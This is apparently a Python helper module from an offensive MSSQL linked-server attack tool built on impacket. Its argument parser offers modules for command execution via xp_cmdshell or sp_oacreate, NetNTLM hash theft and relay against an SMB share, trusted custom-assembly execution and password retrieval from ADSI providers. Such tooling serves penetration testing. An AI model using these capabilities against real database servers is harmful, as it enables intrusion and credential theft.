import json
import argparse
import binascii
import hashlib
from impacket import LOG
from playbooks import Queries


def decode_results(list_of_results: list) -> [dict, list]:
    """
    This function is responsible to decode object content.
    """
    if isinstance(list_of_results, list):
        container = []
        for row in list_of_results:
            container.append(decode_results(row))
        return container
    if list_of_results and isinstance(list_of_results, dict):
        for key, value in list_of_results.items():
            if hasattr(type(key), 'decode'):
                key = value.decode()

            if hasattr(type(value), 'decode'):
                list_of_results[key] = value.decode()
        return list_of_results


def convert_state(state: dict) -> [dict]:
    """
    This function is responsible to convert the state to a serializable object.
    """
    if isinstance(state, list):
        container = []
        for row in state:
            container.append(convert_state(row))
        return container
    elif isinstance(state, set):
        return list(state)

    elif state and isinstance(state, dict):
        for key, value in state.items():
            state[key] = convert_state(value)
        return state
    return state


def hexlify_file(file_location: str) -> str:
    """
    This function is responsible to convert a file to hex.
    """
    return f'0x{binascii.hexlify(open(file_location, "rb").read()).decode()}'


def remove_service_name(server_name: str) -> str:
    """
    This function is responsible to remove the service name from discovered server.
    Example:
        ServerName\\InstanceName -> ServerName
    """
    return server_name.split("\\")[0].strip()


def retrieve_procedure_custom_name(procedure_name: str) -> str:
    """
    This function is responsible to retrieve the custom name of a procedure.
    Example:
        [dbo].[usp_GetUser] -> usp_GetUser
        sp_oacreate -> Ole Automation Procedures
        xp_cmdshell -> xp_cmdshell
    """

    if procedure_name == "sp_oacreate":
        return "Ole Automation Procedures"
    return procedure_name


def escape_single_quotes(query: str) -> str:
    """
    This function is responsible to escape single quotes.
    """
    return query.replace("'", "''")


def store_state(filename, state) -> None:
    """
    This function is responsible to store the current state.
    """
    state = convert_state(state)
    json.dump(state, open(filename, 'w'), indent=4)
    LOG.info("Enumeration completed successfully")
    LOG.info("Saving state to file")


def print_state(state: dict):
    """
    This function is responsible to print the last enumeration from the stored state.
    """

    LOG.info(f"Discovered hostname: {state['hostname']}")
    for adsi_provider_servers in state['adsi_provider_servers'].keys():
        LOG.info(f"{adsi_provider_servers} is an ADSI provider (can be abused by the retrieve-password module!)")

    LOG.info("Linkable servers:")
    for chain in state['linkable_servers'].keys():
        LOG.info(f"\t{chain}")

    for linked_server in state['impersonation_users'].keys():
        for username in state['impersonation_users'][linked_server]:
            LOG.info(f"Can impersonate as {username} on {linked_server} chain")

    for linked_server in state['authentication_users'].keys():
        for username in state['authentication_users'][linked_server]:
            LOG.info(f"Can authenticate as {username} on {linked_server} chain")


def build_openquery(linked_server: str, query: str) -> str:
    """
    This function is responsible to embed a query within OpenQuery.
    OpenQuery executes a specified pass-through query on the specified linked server
    """
    return Queries.OPENQUERY.format(linked_server=linked_server, query=escape_single_quotes(query))


def build_exec_at(linked_server: str, query: str) -> str:
    """
    This function is responsible to embed a query within a procedure (That can also contains a query)
    exec executes a command string or character string within a Transact-SQL batch.
    This function uses the "at" argument to refer the query to another linked server.
    """
    return Queries.EXEC_AT.format(linked_server=linked_server, query=escape_single_quotes(query))


def return_result(status, replay, result):
    return {"is_success": status, "replay": replay, "results": result}


def calculate_sha512_hash(file_path: str) -> str:
    """
        This function is responsible to calculate the sha512 hash of a custom assembly in order to mark it as trusted.
        This operation is necessary to execute custom assemblies on the server using chained queries.
        This must be done since once we used chained query for custom assemblies,
        it cannot execute the procedure creation using chosen database,
        and that operation is necessary to create custom assemblies procedure in the master db.
    """
    sha512_hash = hashlib.sha512()
    with open(file_path, "rb") as f:
        while True:
            data = f.read()
            if not data:
                break
            sha512_hash.update(data)
    return f"0x{sha512_hash.hexdigest()}"


def generate_arg_parser():
    """
    This function is respponsible to manage the arguments passed to the script.
    """
    parser = argparse.ArgumentParser(add_help=True, description="TDS client implementation (SSL supported).")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-port', action='store', default='1433', help='target MSSQL port (default 1433)')
    parser.add_argument('-db', action='store', help='MSSQL database instance (default None)')
    parser.add_argument('-windows-auth', action='store_true', default=False, help='whether or not to use Windows '
                                                                                  'Authentication (default False)')

    parser.add_argument('-no-state', action='store_true', default=False, help='whether or not to load existing state ')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. '
                            'If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) '
                                                                            'specified in the target parameter')

    module = parser.add_argument_group('Choose module')
    module.add_argument("-link-server", help="Linked server to launch queries", default=None)
    module.add_argument("-max-recursive-links", help="Maximum links you want to scrape recursively", default=4,
                        type=int)

    modules = parser.add_subparsers(title='Modules', dest='module')
    modules.add_parser('enumerate', help='Enumerate MSSQL server')
    command_execution = modules.add_parser('exec', help='Command to execute')
    command_execution.add_argument("-command-execution-method", choices=['xp_cmdshell', 'sp_oacreate'],
                                   default='xp_cmdshell')
    command_execution.add_argument("command", help="Command to execute")

    ntlm_relay = modules.add_parser('ntlm-relay', help='Steal NetNTLM hash / Relay attack')
    ntlm_relay.add_argument("smb_server", help="Steal NetNTLM hash / Relay attack (Example: \\\\192.168.1.1\\test)")
    ntlm_relay.add_argument("-relay-method", choices=['xp_dirtree', 'xp_subdirs', 'xp_fileexist'],
                            default='xp_fileexist')

    custom_asm = modules.add_parser('custom-asm', help='Execute procedures using custom assembly')
    custom_asm.add_argument("-arch", choices=['x86', 'x64'], default='x64')
    custom_asm.add_argument("-procedure_name", choices=['execute_command', 'run_query', 'run_query_system_service'],
                            default='execute_command')
    custom_asm.add_argument("command", help="Command to execute")

    direct_query = modules.add_parser('direct_query', help='Execute direct query')
    direct_query.add_argument("query", help="Query to execute")
    direct_query.add_argument("-method", choices=['OpenQuery', 'exec_at'], default='OpenQuery')

    retrieve_passwords = modules.add_parser('retrieve-password', help='Retrieve password from ADSI servers')
    retrieve_passwords.add_argument("-listen-port",
                                    help="Port to listen on (default 389)", type=int, default=1489)
    retrieve_passwords.add_argument("-adsi-provider", help="Password to be retrieved from ADSI provider "
                                                           "(if not defined, it will choose automatically)",
                                    default=None)
    retrieve_passwords.add_argument("-arch", choices=['x86', 'x64'], default='x64')
    return parser
